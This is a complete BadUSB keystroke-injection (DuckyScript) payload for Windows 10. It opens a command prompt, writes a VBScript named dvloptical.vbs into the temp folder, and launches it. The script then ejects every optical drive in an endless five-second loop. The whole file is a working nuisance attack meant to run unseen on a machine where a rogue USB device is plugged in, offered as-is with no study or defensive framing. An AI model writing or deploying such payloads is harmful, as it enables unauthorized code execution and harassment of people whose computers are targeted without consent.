REM for Windows 10
GUI r
DELAY 300
STRING cmd
ENTER
DELAY 800
STRING del %tmp%\dvloptical.vbs
ENTER
DELAY 200
STRING cd %tmp% && copy con dvloptical.vbs
ENTER
STRING Set oWMP = CreateObject("WMPlayer.OCX.7")
ENTER
STRING Set colCDROMs = oWMP.cdromCollection
ENTER
STRING do
ENTER
STRING if colCDROMs.Count >= 1 then
ENTER
STRING For i = 0 to colCDROMs.Count -1
ENTER
STRING colCDROMs.Item(i).Eject
ENTER
STRING Next
ENTER
STRING For i = 0 to colCDROMs.Count -1
ENTER
STRING colCDROMs.Item(i).Eject
ENTER
STRING Next
ENTER
STRING End If
ENTER
STRING wscript.sleep 5000
ENTER
STRING loop
ENTER
DELAY 100
CTRL z
ENTER
STRING start dvloptical.vbs
ENTER
STRING exit
ENTER